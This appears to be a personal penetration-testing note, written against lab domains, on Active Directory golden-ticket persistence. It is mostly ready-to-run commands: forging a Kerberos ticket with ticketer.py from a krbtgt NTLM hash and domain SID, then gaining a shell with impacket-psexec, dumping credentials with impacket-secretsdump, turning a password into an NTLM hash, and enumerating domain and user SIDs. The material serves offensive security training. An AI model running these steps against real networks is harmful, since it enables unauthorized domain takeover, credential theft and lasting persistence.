---
sticker: emoji//1f3ab
tags:
  - Persistence
---
### Requirements
- Knowledge of the domain name
- Knowledge of the domain SID
- The NTLM hash of the krbtgt account
- FQDN

```shell
ticketer.py -nthash a306ec332190b61b7ff89ac1c0d5b1ad -domain-sid S-1-5-21-1558345677-4257867870-1842270656 -domain lol.local -user-id 500 -dc-ip 10.10.111.10 Administrator

export KRB5CCNAME=administrator.ccache

impacket-psexec -k -no-pass dc01.lol.local

```



---

### getting `NTLM` hash or the plain password:

 1. using impacket-secretdump (has to be domain admin account) 
 ```shell
 impacket-secretsdump 'north.sevenkingdoms.local/vagrant:vagrant@192.168.56.11'
```
 
 2.  mimkatz LSASS dump
 3. DCSync attack 
 4. Kerberoast > Crack > NTLM
 ```shell
 # this will get us the NTLM hash
 echo -n 'Password123!' | iconv -f utf-8 -t utf-16le | openssl dgst -md4 
```

---
### Getting Domain SID:
its basically the first part of any SID object.
```powershell
nxc:
nxc ldap lol.local -u sqlsvc -p test -k --get-sid

ldapsearch:
ldapsearch -x -H ldap://<DC_IP> -b "" -s base objectSid

impacket-GetADUsers:
impacket-GetADUsers domain/user:password@<DC_IP> -all

rpcclient:
rpcclient $> lookupdomain north.sevenkingdoms.local

Get-ADDomain | Select-Object -ExpandProperty DomainSID

```

### Getting User SID:
```bash
impacket-lookupsid north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@winterfell.north.sevenkingdoms.local

or using nxc smb with -rid switch

```

using [[mimikatz]]


